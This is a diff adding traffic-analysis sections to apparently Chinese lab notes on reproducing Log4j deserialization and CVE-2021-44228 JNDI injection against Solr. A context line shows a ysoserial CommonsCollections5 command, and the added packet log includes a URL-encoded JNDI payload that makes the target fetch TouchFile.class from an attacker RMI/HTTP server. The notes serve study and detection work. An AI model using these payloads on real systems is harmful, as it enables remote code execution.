@@ -42,6 +42,25 @@ java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections5 "touch /tmp/succe
 被攻击后 ：
 	![](./img/file-20260831154440158.png)
 
+### 日志流量
+**流量分析**
+![](./img/file-20260901171119757.png)
+==Java 原生序列化通常以：AC ED 00 05开始==
+TCP 连接
+    ↓
+Java Object Serialization 二进制流
+    ↓
+Log4j TcpSocketServer 反序列化
+    ↓
+CommonsCollections5 链触发命令执行
+
+	5695-5697  建立到 4712 端口的 TCP 连接
+	5702       出现 Java 序列化流起始数据
+	5702-5734  持续发送完整二进制序列化 Payload
+	5735       目标持续确认接收
+**日志**
+![](./img/file-20260901171513616.png)
+
 ## Log4j2 JNDI 注入（CVE-2021-44228）
 **原理**：
 
@@ -107,6 +126,41 @@ rmi服务器接收到请求并将受害者指引到攻击者恶意文件服务�
 docker 容器中执行命令创建success文件
 	![](./img/file-20260831171038155.png)
 
+### 日志流量
+**流量分析**
+![](./img/file-20260901174923329.png)
+```
+1164  49884 -> 8983    [SYN]
+1165  8983 -> 49884    [SYN, ACK]
+1166  49884 -> 8983    [ACK]
+
+1167  192.168.230.141:49884 -> 192.168.230.143:8983
+      GET /solr/admin/cores?action=%24%7Bjndi%3Armi%3A%2F%2F192.168.230.141%3A9999%2FTouchFile%7D HTTP/1.1
+
+1169  8983 -> 49884
+      HTTP/1.1 400 Bad Request
+
+1175-1188
+      192.168.230.143:44354 <-> 192.168.230.141:9999
+      RMI/JRMP 回连及数据交换
+
+1189-1201
+      192.168.230.143:54734 -> 192.168.230.141:9000
+      GET /TouchFile.class HTTP/1.1
+      HTTP/1.0 200 OK
+      Content-Type: application/java-vm
+
+1204-1231
+      第二次 192.168.230.143 -> 192.168.230.141:9999 的 RMI 回连
+
+1232-1241
+      第二次请求 /TouchFile.class，并返回 200
+
+3497-3498
+      9999 RMI 会话关闭
+```
+**日志**
+![](./img/file-20260901180731958.png)
 ## 防御
 - 升级 `log4j-core` 到官方修复版本，Java 8 环境至少使用 `2.17.1` 或更高版本。
 - 升级 JDK，并禁止业务容器访问外部 LDAP、RMI 和未知 HTTP 服务。
